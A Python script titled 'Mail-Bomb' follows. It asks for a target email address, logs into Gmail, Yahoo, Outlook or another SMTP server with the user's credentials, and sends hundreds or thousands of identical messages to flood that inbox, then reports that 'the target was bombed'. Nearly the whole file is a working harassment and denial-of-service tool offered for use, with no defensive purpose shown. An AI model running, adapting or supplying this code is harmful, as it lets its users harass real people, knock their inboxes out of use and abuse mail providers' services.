"""

This software was created by Edinson Requena, Feel free to modify, download or copy it. use it for good <3

Instagram: edinsonrequena
Medium: edinsonrequena
Facebook: Edinson Requena
Twitter: requenaea

"""

import smtplib
import sys


class colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'


def draw():
    print(colors.GREEN + "*"*20, 'Mail-Bomb', "*"*20)
    print(colors.GREEN + '''

███████╗██╗██████╗ ███████╗██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗███████╗
██╔════╝██║██╔══██╗██╔════╝██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██╔════╝
█████╗  ██║██████╔╝█████╗  ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ███████╗
██╔══╝  ██║██╔══██╗██╔══╝  ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚════██║
██║     ██║██║  ██║███████╗╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗███████║
╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝ ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
                                                                            
                                                                      
 ''')


class EmailBomb:
    count = 0

    def __init__(self):
        try:
            print(colors.RED + "*"*20, "Initializing software", "*"*20)
            self.infect = input(colors.GREEN + 'Enter the email to bomb: ')
            self.mode = int(input(colors.GREEN + 'Enter the number of bombs (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) <: '))
            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print("ERROR: That option doesn't exist. Try again.")
                sys.exit(1)
        except Exception as e:
            print(f'ERROR: {e}')


    def bomb(self):
        try:
            print(colors.RED + '*'*20, 'Customize your bomb', "*"*20)
            self.amount = None
            if self.mode == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                self.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(250)
            else:
                self.amount = int(input(colors.GREEN + 'Choose a CUSTOM amount: '))
            print(colors.RED + f'\n You have selected BOMB mode: {self.mode} and {self.amount} emails')
        except Exception as e:
            print(f'ERROR: {e}')


    def email(self):
        try:
            print(colors.RED + "*"*20, 'Setting up emai', "*"*20)
            self.server = input(colors.GREEN + 'Enter email server / or select premade options - 1:Gmail 2:Yahoo 3:Outlook <: ')
            premade = ['1', '2', '3']
            default_port = True
            if self.server not in premade:
                default_port = False
                self.port = int(input(colors.GREEN + 'Enter a valid port number: '))

            if default_port == True:
                self.port = int(587)

            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'

            self.fromAddr = input(colors.GREEN + 'Enter your email address: ')
            self.fromPwd = input(colors.GREEN + 'Enter your password: ')
            self.subject = input(colors.GREEN + 'Enter subject: ')
            self.message = input(colors.GREEN + 'Enter message: ')

            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
            ''' % (self.fromAddr, self.infect, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f'ERROR: {e}')


    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.infect, self.msg)
            self.count +=1
            print(colors.YELLOW + f'BOMB: {self.count}')
        except Exception as e:
            print(f'ERROR: {e}')


    def fireworks(self):
        print(colors.RED + '\n THIS WILL BE FIREWORKS...')
        for email in range(self.amount+1):
            self.send()
        self.s.close()
        print(colors.RED + '\n The target was bombed')
        sys.exit(0)

class BombApp:

    def execute(self):
        draw()
        bomb = EmailBomb()
        bomb.bomb()
        bomb.email()
        bomb.fireworks()

if __name__=='__main__':
    BombApp().execute()